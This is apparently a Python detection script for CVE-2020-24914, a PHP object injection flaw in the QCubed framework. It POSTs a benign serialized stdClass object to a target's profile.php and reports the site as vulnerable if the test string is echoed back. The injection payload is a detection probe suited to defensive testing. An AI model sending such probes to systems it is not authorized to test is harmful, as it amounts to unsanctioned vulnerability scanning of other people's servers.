#!/usr/bin/env python3
"""
Test script for CVE-2020-24914 (QCubed PHP Object Injection)
"""

import requests
import sys
import random
import string

def generate_random_string(length=10):
    """Generate a random string for testing"""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def test_qcubed_vulnerability(base_url):
    """Test the QCubed PHP Object Injection vulnerability"""
    
    # Generate random test data
    test_string = generate_random_string()
    serialized_data = f'O:8:"stdClass":1:{{s:4:"test";s:{len(test_string)}:"{test_string}";}}'
    
    # Test URL
    test_url = f"{base_url.rstrip('/')}/profile.php"
    
    print(f"[+] Testing URL: {test_url}")
    print(f"[+] Serialized data: {serialized_data}")
    
    # Prepare the POST data
    post_data = {
        'data': serialized_data,
        'action': 'save',
        'id': '1'
    }
    
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    try:
        # Send the POST request
        response = requests.post(test_url, data=post_data, headers=headers, timeout=10)
        
        print(f"[+] Response Status: {response.status_code}")
        print(f"[+] Response Headers: {dict(response.headers)}")
        print(f"[+] Response Body: {response.text[:500]}...")
        
        # Check if the vulnerability is present
        if response.status_code == 200:
            if test_string in response.text and "stdClass" in response.text:
                print("[+] VULNERABLE: CVE-2020-24914 detected!")
                print("[+] The application is vulnerable to PHP Object Injection")
                return True
            else:
                print("[-] NOT VULNERABLE: No evidence of object injection found")
                return False
        else:
            print(f"[-] Unexpected status code: {response.status_code}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Error making request: {e}")
        return False

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 test-vulnerability.py <base_url>")
        print("Example: python3 test-vulnerability.py http://localhost:8081")
        sys.exit(1)
    
    base_url = sys.argv[1]
    
    print("=" * 60)
    print("CVE-2020-24914 - QCubed PHP Object Injection Test")
    print("=" * 60)
    
    # Test the vulnerability
    is_vulnerable = test_qcubed_vulnerability(base_url)
    
    print("\n" + "=" * 60)
    if is_vulnerable:
        print("RESULT: VULNERABLE - CVE-2020-24914 confirmed")
        print("RECOMMENDATION: Update QCubed framework immediately")
    else:
        print("RESULT: NOT VULNERABLE - No evidence of CVE-2020-24914")
    print("=" * 60)

if __name__ == "__main__":
    main() 